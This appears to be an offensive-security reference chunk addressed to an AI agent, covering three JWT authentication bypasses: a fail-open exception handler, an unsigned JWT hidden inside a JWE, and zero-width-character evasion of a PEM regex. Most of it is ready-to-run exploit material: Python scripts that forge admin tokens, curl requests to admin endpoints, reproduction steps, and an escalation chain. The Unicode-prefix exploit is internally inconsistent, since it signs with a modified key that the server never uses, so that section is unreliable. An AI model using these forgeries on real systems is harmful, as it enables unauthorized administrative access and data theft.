# JWT Fail-Open, JWE Bypass & PEM Regex Evasion — Agent Chunk 74c
> Source: Deep Internet Research 2026 (Adversarially Verified)
> Purpose: Understand three new JWT attack classes that bypass authentication through exception swallowing, JWE envelope cloaking, and Unicode prefix regex evasion — none of which are classic alg:none or algorithm confusion
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
When testing JWT-based APIs, go beyond standard alg:none and algorithm confusion tests. Test for fail-open behavior by sending JWTs with bogus/unsupported algorithm headers and observing if the request proceeds authenticated. Test JWE envelope attacks by wrapping unsigned PlainJWTs inside legitimately encrypted JWE containers. Test PEM detection regex evasion by prepending Unicode zero-width characters to PEM keys before attempting algorithm confusion. These three classes represent a generational shift: they exploit error handling, layered cryptography assumptions, and patch implementation flaws respectively.

---

## 1. JWT Fail-Open via Exception Swallowing

### 1.1 Vulnerability Overview (CVE-2026-5430)

| Field | Value |
|-------|-------|
| CVE | CVE-2026-5430 |
| CVSS | 10.0 (Critical) |
| Affected | WSO2 API Manager 4.1.0 through 4.6.0 |
| CISA KEV | Added 2026-09-24 |
| Class | CWE-755 (Improper Handling of Exceptional Conditions) |

This is NOT alg:none or algorithm confusion. The exception handling path IS the vulnerability.

### 1.2 Root Cause Analysis

The `OAuthAuthenticationInterceptor` in WSO2 API Manager catches `APIManagementException` thrown when the JWT library encounters an unsupported algorithm. The catch block logs the error but does not terminate the request — it silently swallows the exception and allows the request to proceed as if authentication succeeded.

**Vulnerable code pattern:**
```java
// WSO2 OAuthAuthenticationInterceptor (simplified)
public boolean handleRequest(MessageContext messageContext) {
    try {
        String authHeader = getAuthorizationHeader(messageContext);
        String token = extractBearerToken(authHeader);
        
        // This throws APIManagementException for unsupported algorithms
        JWTValidationInfo info = jwtValidator.validateToken(token);
        
        if (info != null && info.isValid()) {
            setAuthenticatedUser(messageContext, info);
            return true;
        }
        return false;  // Properly rejects invalid tokens
        
    } catch (APIManagementException e) {
        // BUG: Exception swallowed — request proceeds as authenticated
        log.error("Error while authenticating request", e);
        return true;  // FAIL-OPEN: implicit allow-all
    }
}
```

The critical issue: when `jwtValidator.validateToken()` throws an exception for an unsupported algorithm like `XS512`, the catch block returns `true` instead of `false`, causing the request to proceed with whatever claims are in the JWT payload — completely unverified.

### 1.3 Exploitation

**Craft a JWT with a bogus algorithm header:**
```python
import base64
import json

# Step 1: Create header with unsupported algorithm
header = {"alg": "XS512", "typ": "JWT"}

# Step 2: Create payload with admin claims
payload = {
    "sub": "admin",
    "iss": "https://target-wso2.com",
    "exp": 9999999999,
    "http://wso2.org/claims/role": "admin,Internal/everyone",
    "http://wso2.org/claims/applicationname": "DefaultApplication",
    "http://wso2.org/claims/tier": "Unlimited"
}

# Step 3: Encode with garbage signature (it won't be verified)
h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
sig = base64.urlsafe_b64encode(b'garbage-signature-never-checked').rstrip(b'=')

forged_token = f"{h.decode()}.{p.decode()}.{sig.decode()}"
print(f"Bearer {forged_token}")
```

**Send the forged token:**
```bash
curl -H "Authorization: Bearer ${FORGED_TOKEN}" \
     https://target-wso2.com/api/v1/admin/config \
     -v
# Expected: 200 OK — exception swallowed, admin access granted
```

### 1.4 Reproduction Steps

1. Identify target running WSO2 API Manager 4.1.0 through 4.6.0
2. Craft JWT with unsupported algorithm header (`XS512`, `PS384FAKE`, etc.)
3. Set admin-level claims in the payload (roles, permissions, tier)
4. Use any arbitrary signature — it will never be verified
5. Send as Bearer token in the Authorization header
6. Server returns 200 — the exception for the unsupported algorithm is swallowed
7. Request proceeds with forged admin claims fully trusted

### 1.5 Chaining

Forged admin JWT -> BOLA/BFLA on admin-only endpoints -> SSRF via admin proxy/configuration APIs -> supply chain compromise via malicious API deployment

---

## 2. JWE-Wrapped Unsigned JWT (CVE-2026-29000)

### 2.1 Vulnerability Overview

| Field | Value |
|-------|-------|
| CVE | CVE-2026-29000 |
| Affected | pac4j-jwt before 4.5.9, 5.7.9, 6.3.3 |
| Class | CWE-347 (Improper Verification of Cryptographic Signature) |

Hides an unsigned PlainJWT (alg:none) inside a legitimately encrypted JWE wrapper. The server decrypts the JWE successfully but fails to verify that the inner JWT is signed.

### 2.2 Root Cause Analysis

```java
// pac4j JwtAuthenticator (simplified vulnerable logic)
public CommonProfile validateToken(String token) {
    JWT jwt;
    
    // Step 1: Token is encrypted (JWE) — decrypt with server private key
    if (isEncrypted(token)) {
        jwt = decryptJWE(token);  // Succeeds — valid JWE encryption
    } else {
        jwt = JWTParser.parse(token);
    }
    
    // Step 2: Check if decrypted JWT is signed
    SignedJWT signedJWT = jwt.toSignedJWT();
    
    if (signedJWT != null) {
        // Verify signature — normal path
        verifySignature(signedJWT);
    }
    // BUG: If toSignedJWT() returns null (PlainJWT), 
    // signature verification is SKIPPED entirely
    
    // Step 3: Extract claims regardless — no signature check occurred
    return createProfile(jwt.getJWTClaimsSet());
}
```

`toSignedJWT()` returns `null` for a `PlainJWT`. The null check causes signature verification to be skipped entirely. Claims are extracted and a user profile is created despite zero signing verification.

### 2.3 Exploitation

```python
from jwcrypto import jwk, jwe
import json
import base64

# Step 1: Get server's RSA public key from JWKS endpoint
# curl https://target.com/.well-known/jwks.json
server_pubkey_jwk = {
    "kty": "RSA",
    "n": "<server-public-key-n>",
    "e": "AQAB",
    "kid": "target-key-id"
}

# Step 2: Construct PlainJWT (alg: none, no signature)
plain_header = {"alg": "none", "typ": "JWT"}
plain_payload = {
    "sub": "admin@target.com",
    "roles": ["ADMIN", "SUPERUSER"],
    "iss": "https://target.com",
    "exp": 9999999999
}

h = base64.urlsafe_b64encode(json.dumps(plain_header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(plain_payload).encode()).rstrip(b'=')
# PlainJWT: header.payload. (empty signature segment)
inner_jwt = f"{h.decode()}.{p.decode()}."

# Step 3: Wrap in JWE using RSA-OAEP-256 + A128GCM
key = jwk.JWK(**server_pubkey_jwk)
jwe_token = jwe.JWE(
    inner_jwt.encode('utf-8'),
    json.dumps({
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM",
        "cty": "JWT",         # Content type signals nested JWT
        "kid": "target-key-id"
    })
)
jwe_token.add_recipient(key)

encrypted_token = jwe_token.serialize(compact=True)
print(f"Bearer {encrypted_token}")
```

```bash
curl -H "Authorization: Bearer ${ENCRYPTED_TOKEN}" \
     https://target.com/api/admin/users \
     -v
# Expected: 200 — JWE decrypted, PlainJWT inside, signature check skipped
```

### 2.4 Why WAFs Fail

WAFs see a valid JWE token (five Base64url segments with legitimate encryption). The `alg:none` is hidden inside the encrypted payload — invisible to any network-level inspection. The JWE encryption provides a false veneer of cryptographic protection.

### 2.5 Reproduction Steps

1. Obtain the server's RSA public key from the JWKS endpoint (`/.well-known/jwks.json`)
2. Construct a PlainJWT (`alg: none`) with desired admin claims
3. Wrap the PlainJWT inside a JWE using `RSA-OAEP-256` and `A128GCM`, with content-type `JWT`
4. Send the JWE as a Bearer token
5. Server decrypts JWE with its private key, finds PlainJWT inside
6. `toSignedJWT()` returns null, signature verification is skipped
7. Claims are extracted and user profile is created with admin privileges

---

## 3. PEM Detection Regex Evasion via Unicode Prefixes

### 3.1 Vulnerability Overview

| Field | Value |
|-------|-------|
| CVEs | CVE-2026-34950, CVE-2026-107722 |
| Affected | fast-jwt (npm) |
| Class | CWE-185 (Incorrect Regular Expression) + CWE-176 (Improper Unicode Handling) |

This is a META-VULNERABILITY: the patch for algorithm confusion itself creates a new bypass path.

### 3.2 Root Cause Analysis

The original patch for algorithm confusion in fast-jwt added PEM key detection:

```javascript
// fast-jwt patched validation (vulnerable to bypass)
function validateKey(key) {
    const trimmedKey = key.trim();
    
    // Regex uses ^ anchor to detect PEM format
    if (/^-----BEGIN (RSA |EC )?PUBLIC KEY-----/.test(trimmedKey)) {
        // PEM detected — enforce asymmetric algorithm only
        if (algorithm === 'HS256' || algorithm === 'HS384' || algorithm === 'HS512') {
            throw new Error('Cannot use HMAC with asymmetric key');
        }
    }
    
    // If PEM not detected, allow HMAC signing
    return createHmacVerifier(key, algorithm);
}
```

The bypass: `String.prototype.trim()` in ECMAScript only strips characters in the `WhiteSpace` and `LineTerminator` categories. It does NOT strip:
- Zero-width space (U+200B)
- Zero-width non-joiner (U+200C)
- Zero-width joiner (U+200D)
- Byte order mark when used as prefix (U+FEFF in some contexts)
- Other Unicode format characters

### 3.3 Exploitation

```python
import jwt
import requests

# Step 1: Get server's RSA public key
resp = requests.get('https://target.com/.well-known/jwks.json')
public_key_pem = get_pem_from_jwks(resp.json())
# public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIIBI..."

# Step 2: Prepend zero-width space to defeat regex + trim()
evasion_key = "​" + public_key_pem
# evasion_key = "<ZWSP>-----BEGIN PUBLIC KEY-----\nMIIBI..."
# trim() does NOT remove U+200B
# Regex ^-----BEGIN fails because ^ sees U+200B first

# Step 3: Craft HS256 JWT signed with the modified key
token = jwt.encode(
    {"sub": "admin", "role": "superuser", "exp": 9999999999},
    evasion_key,           # PEM content used as HMAC secret
    algorithm="HS256"
)

# Step 4: Send — server uses same public key for HMAC verification
# The PEM regex check fails, falls through to HMAC path
# Server verifies: HMAC-SHA256(token, public_key) == signature ✓
print(f"Bearer {token}")
```

**Alternative evasion characters:**
```python
evasion_variants = [
    "​" + public_key_pem,  # Zero-width space
    "‌" + public_key_pem,  # Zero-width non-joiner
    "‍" + public_key_pem,  # Zero-width joiner
    "﻿" + public_key_pem,  # BOM
    "\u0000" + public_key_pem,  # Null byte
    "‎" + public_key_pem,  # Left-to-right mark
]
```

### 3.4 Reproduction Steps

1. Obtain the server RSA public key from JWKS or certificate
2. Prepend U+200B (zero-width space) to the PEM string
3. Craft an HS256 JWT with desired claims
4. Sign with the modified PEM key as the HMAC secret
5. Send as Bearer token — PEM detection regex fails, HMAC path executes
6. Server verifies using its public key as HMAC secret — signature validates

---

## 4. Detection Methodology

### 4.1 Bogus Algorithm Testing (Fail-Open Detection)

```python
# Test with multiple unsupported algorithm values
bogus_algorithms = [
    "XS512", "PS384FAKE", "EdDSA2", "NONE", "None", 
    "RS256-v2", "HS512+", "A256GCM", "dir"
]

for alg in bogus_algorithms:
    token = craft_jwt(alg=alg, claims=admin_claims, sig="garbage")
    resp = send_request(token)
    if resp.status_code == 200:
        print(f"FAIL-OPEN DETECTED: algorithm '{alg}' accepted")
```

### 4.2 JWE Envelope Testing

```python
# Test nested JWT scenarios
test_cases = [
    ("PlainJWT in JWE", construct_jwe_wrapped_plain_jwt()),
    ("HS256 JWT in JWE", construct_jwe_wrapped_hs256_jwt()),
    ("Expired JWT in JWE", construct_jwe_wrapped_expired_jwt()),
]

for name, token in test_cases:
    resp = send_request(token)
    print(f"{name}: {resp.status_code}")
```

### 4.3 Unicode Prefix Testing

```python
# Test PEM regex evasion with various Unicode prefixes
unicode_prefixes = [
    "​", "‌", "‍", "﻿",
    "\u0000", "‎", "‏", "‪",
]

for prefix in unicode_prefixes:
    modified_key = prefix + server_public_key_pem
    token = jwt.encode(admin_claims, modified_key, algorithm="HS256")
    resp = send_request(token)
    if resp.status_code == 200:
        print(f"PEM REGEX EVASION: prefix U+{ord(prefix):04X} bypasses detection")
```
